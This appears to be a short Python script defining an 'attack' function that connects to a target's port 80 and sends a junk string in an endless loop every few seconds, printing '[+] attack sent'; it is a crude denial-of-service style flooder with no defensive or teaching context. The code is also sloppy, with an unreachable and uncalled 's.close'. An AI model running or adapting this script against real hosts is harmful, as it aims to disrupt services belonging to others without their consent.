import socket
import time
def attack(target):

		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((target,80))
		while True:
			data = "AAAAAAAAAAAAAAAAAAAAAAAAAAAARDREERDRSRE"
			s.send(data.encode("utf-8"))
			s.send(data.encode("utf-8"))
			print("\n [+] attack sent ")
			time.sleep(3)
		s.close

	